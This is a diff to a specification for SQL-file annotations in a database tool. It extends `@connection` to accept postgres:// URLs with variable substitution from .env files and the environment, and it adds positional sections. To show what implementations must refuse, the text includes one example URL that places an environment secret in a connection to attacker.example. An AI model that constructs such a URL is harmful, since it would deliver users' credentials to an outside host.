@@ -285,7 +285,7 @@ MUST behave exactly as described.
 | `@toolbar` | | `@toolbar [place] [icon] [label]` | action | query, command | no button in the title bar |
 | `@color` | | `@color <name>` | action | query, command | no color: every mark of the action wears the ordinary chrome |
 | `@face` | | `@face result\|source` | action | query, command | `source`: a click on the file's row opens the file, as for any file |
-| `@connection` | | `@connection <id or name>` | action | query, command | the action runs on the connection the gesture came with, and the user may pick another |
+| `@connection` | | `@connection <id, name or url>` | action | query, command | the action runs on the connection the gesture came with, and the user may pick another |
 | `@extension` | | `@extension <id>[:<tab>] [\| <id>[:<tab>] ...] [as <title>] [open\|only\|beside] [, ...]` | action | query | this file's results carry only what an implementation's result-shaping extensions scope to them on their own; where the line sits MAY narrow it to one query |
 | `@inputs` | | `@inputs [<id>:] <key>=<value> [, <key>=<value> ...]` | action | query | a result view's inputs take the view's own defaults, and the implementation MAY ask for one that has none |
 | `@ask` | | `@ask [<key> [, <key> ...]]` | action | query | the implementation asks for inputs only when a required one has no answer |
@@ -762,7 +762,7 @@ SHOULD carry a `@confirm` (8.21). A value outside the vocabulary MUST
 be diagnosed and reads as `source`. Implementations that list no files
 MUST accept and ignore it.
 
-### 8.25 `@connection <id or name>`
+### 8.25 `@connection <id, name or url>`
 
 The connection the action runs on, from every door, whatever
 connection the gesture came with: a dashboard for one server, a backup
@@ -772,6 +772,39 @@ connection's permanent IDENTIFIER exactly, else a connection's display
 NAME compared case-insensitively against the names the implementation
 knows. A file usually names a connection the way a person does, by
 name; the identifier is for the case names cannot settle.
+
+The value MAY instead be a connection URL, `postgres://` or
+`postgresql://` (libpq's URI form), which names the server itself
+rather than a connection the implementation knows:
+
+```sql
+-- @connection postgres://app:${APP_PASSWORD}@127.0.0.1:5432/orders
+```
+
+A `${NAME}` anywhere in the URL is replaced by the value of the
+variable NAME (a letter or an underscore, then letters, digits and
+underscores), read from the files the implementation reads variables
+from for the directory the file belongs to (the reference
+implementation: the workspace root's `.env` and `.env.*` files, later
+names winning), else from the environment. The value is escaped for
+the place it fills. A name nothing sets MUST be diagnosed and the
+action MUST NOT run. The value of a variable that comes from the
+ENVIRONMENT MUST NOT be sent to a host the file itself names, unless
+that host is the local machine: a file of
+`postgres://${CLOUD_SECRET}@attacker.example/db` must not deliver the
+user's secret. A host that itself comes from the environment MAY
+receive them, and values from the directory's own files are the
+file's own and MAY go anywhere. A refused URL MUST be diagnosed with
+the host named and the action MUST NOT run.
+
+The values filled in, a password among them, MUST NOT appear where the
+implementation shows the line, a message or the connection (the
+reference implementation resolves the URL in its server and shows the
+URL as written); a password written in the URL literally MUST be masked
+wherever the line is shown. The implementation MAY treat the URL as a
+connection of its own for as long as the file writes it (the reference
+implementation lists it as a discovered connection whose source is the
+file).
 
 A name is not an identity and several connections MAY carry one. When
 they do, the implementation MUST run the action on the FIRST of them
@@ -805,6 +838,24 @@ an edit, a restore or a change on disk) and MUST NOT offer another
 connection while the line stands: the way to pick again is to remove
 the line. A value that resolves to nothing MUST refuse the run with
 the reason.
+
+In a plain file the line is also POSITIONAL: a `--` line comment of its
+own, standing between two statements (the last line of code above it
+ends its statement with `;`), starts a SECTION that runs to the next
+such line, and the statements in it run on its connection. A line in
+the file's head covers the file from its first line, which is the
+single-line case above; the text above a first section that stands
+lower runs where the file's tab would run without the annotation. A
+line inside a statement starts nothing. Every line of a run resolves
+before anything runs, and one that resolves to nothing MUST refuse the
+whole run. A run whose text crosses sections MUST run each piece on its
+section's connection, in the order of the text, and MUST stop at the
+first piece that fails; what ran before stays. Moving between sections
+MUST NOT end a session the user opened: an implementation keeps one
+session per connection the file has used (a transaction stays open
+where it was left), and ends them all together on the user's gesture.
+An action (a query or a command extension) runs on one connection: in
+one, only the header's line is read.
 
 ### 8.26 `@pick <name> <query>`
 
